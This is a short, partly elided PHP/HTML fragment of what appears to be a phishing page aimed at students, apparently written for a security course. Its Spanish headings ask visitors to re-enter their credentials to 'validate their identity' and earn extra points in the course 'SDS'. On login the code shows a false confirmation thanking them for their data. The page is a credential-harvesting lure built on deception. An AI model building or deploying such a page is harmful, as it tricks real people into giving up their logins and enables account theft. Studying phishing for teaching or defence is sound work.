...
if(isset($_POST['btnLogin'])){
	...
	if (is_null($loginResult)) {
		...
		$error = "Correcto sus puntos han sido otorgados, gracias por sus datos.";
	}
}
...
<body>
<!--header start here-->
<h1>Por favor vuelva a ingresar sus credenciales, para validar su identidad</h1>
<h1>y otorgarle los Puntos Extras en la Materia SDS</h1>
